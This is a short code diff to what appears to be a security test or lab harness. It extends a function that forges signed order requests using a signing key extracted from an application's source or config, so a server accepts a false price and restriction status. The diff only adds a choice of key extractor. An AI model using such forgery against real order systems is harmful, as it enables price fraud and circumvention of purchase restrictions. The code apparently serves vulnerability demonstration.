@@ -154,6 +154,7 @@ def _forge(
 def forge_embedded_key_order(
     base_url: str,
     *,
+    from_config: bool = False,
     account: str = DEFAULT_ACCOUNT,
     password: str = DEFAULT_PASSWORD,
     part_number: str = RESTRICTED_PART,
@@ -164,13 +165,14 @@ def forge_embedded_key_order(
 ) -> AttackResult:
     """Forge false price/restriction fields; the server computes an honest verdict from them."""
 
+    extractor = extract_key_from_config if from_config else extract_key_from_source
     return _forge(
-        base_url, sink="embedded-signing-key", extractor=extract_key_from_source,
+        base_url, sink="embedded-signing-key", extractor=extractor,
         note="Valid signature over a false price and restriction; the server trusted them.",
         account=account, password=password, part_number=part_number,
         work_order_id=work_order_id, unit_price_cents=unit_price_cents,
         restricted=restricted, quantity=quantity, within_limit=None,
-        requires_supervisor=None, digest_login=True,
+        requires_supervisor=None, digest_login=not from_config,
     )
 
 
